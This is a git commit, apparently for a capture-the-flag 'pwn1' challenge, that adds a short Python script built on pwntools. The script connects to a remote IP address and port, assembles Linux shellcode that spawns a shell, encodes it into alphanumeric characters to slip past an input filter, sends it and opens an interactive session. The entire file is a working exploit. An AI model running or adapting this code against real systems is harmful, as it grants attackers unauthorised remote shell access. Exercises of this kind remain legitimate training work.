f2c2bbbe8605fa3de371119b8c5b281984229df2
Hans Tananda <hanstananda@gmail.com>
2021-03-23 15:24:52 +0800

    added folder for pwn1

---
+++ attachments_1/test.py
@@ -0,0 +1,9 @@
+from pwn import *
+context(arch = 'amd64', os = 'linux')
+r = remote('155.69.144.206', 22803)
+cmd = asm(shellcraft.sh())
+# encoder.re_alphanumeric = r'[^A-Z0-9]'
+cmd = encoders.encoder.encode(cmd, expr=r'[^A-Z0-9]')
+print(cmd)
+r.send(cmd)
+r.interactive()
